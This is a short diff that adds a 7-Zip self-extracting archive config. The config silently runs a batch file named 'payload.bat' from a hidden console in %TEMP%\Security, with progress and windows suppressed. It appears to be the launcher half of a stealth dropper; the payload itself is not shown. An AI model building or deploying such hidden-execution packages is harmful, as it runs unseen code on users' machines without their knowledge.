@@ -1,0 +1,9 @@
+;!@Install@!UTF-8!
+RunProgram="hidcon:%%T\\payload.bat %%T %%S %%M"
+InstallPath="%TEMP%\\Security"
+SelfDelete="0"
+OverwriteMode="0"
+GUIFlags="514"
+GUIMode="2"
+Progress="no"
+;!@InstallEnd@!
